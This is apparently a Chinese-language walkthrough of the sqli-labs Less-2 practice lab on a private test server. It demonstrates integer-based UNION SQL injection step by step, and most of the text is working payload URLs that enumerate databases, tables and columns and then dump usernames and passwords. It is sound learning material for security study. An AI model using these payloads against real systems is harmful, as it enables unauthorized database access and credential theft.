sqli-lab2
基于整型的union注入
1.实验环境：centos上搭建的sqli实验环境，通过本机Firefox上的hackbar插件进行sql注入测试：
进入实验二界面：
http://192.168.111.132/Less-2/

首先按照提示在地址后边加上？id=xx
http://192.168.111.132/Less-2/?id=1 结果显示正常！

http://192.168.111.132/Less-2/?id=1 and1=1显示正常

http://192.168.111.132/Less-2/?id=1 and 1=2 显示异常

存在注入 通过判断是整型注入：
接下来order by一下;
http://192.168.111.132/Less-2/?id=1 order by 10 看提示证明没有10个字段

经过一番尝试，判断是有3个字段
http://192.168.111.132/Less-2/?id=1 order by 3

接下来union select 查看显示位：
http://192.168.111.132/Less-2/?id=-1 union select 1,2,3

通过显示位来进行查询自己想要的信息：
http://192.168.111.132/Less-2/?id=-1union select 1,version(),group_concat(distinct+table_schema) from information_schema.tables
首先爆出所有的数据库，其实可以先查询一下有多少个数据库，可以先使用distinct去重一下

查询某个库中有多少个表：
http://192.168.111.132/Less-2/?id=-1 union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=’security’

接下来查询某张表中的字段：
http://192.168.111.132/Less-2/
?id=-1 union select 1,version(),group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’
查询出来有三个字段：

接下来爆出字段里边的内容：
http://192.168.111.132/Less-2/
?id=-1 union select 1,version(),group_concat(id,username,password,0x7c) from security.users
最终结果：

总结：查找一个网站是否存在注入，首先要判断注入类型，接下来根据注入类型进行构造语句，一步一步获取自己想要的信息！
